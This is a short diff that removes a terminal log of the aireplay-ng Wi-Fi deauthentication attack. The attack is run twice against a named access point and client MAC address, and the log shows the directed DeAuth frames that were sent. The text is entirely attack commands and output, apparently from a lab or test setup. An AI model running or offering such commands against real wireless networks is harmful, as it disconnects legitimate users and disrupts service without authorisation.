@@ -1,7 +1,0 @@
-STA2:~# aireplay-ng --deauth 1 wlan0 -a 00:0e:8e:20:83:df -c 00:0E:8E:26:13:C2
-10:57:27  Waiting for beacon frame (BSSID: 00:0E:8E:20:83:DF) on channel 36
-10:57:29  Sending 64 directed DeAuth. STMAC: [00:0E:8E:26:13:C2] [10|64 ACKs]
-STA2:~# aireplay-ng --deauth 1 wlan0 -a 00:0e:8e:20:83:df -c 00:0E:8E:26:13:C2
-10:57:46  Waiting for beacon frame (BSSID: 00:0E:8E:20:83:DF) on channel 36
-10:57:49  Sending 64 directed DeAuth. STMAC: [00:0E:8E:26:13:C2] [ 8|62 ACKs]
-
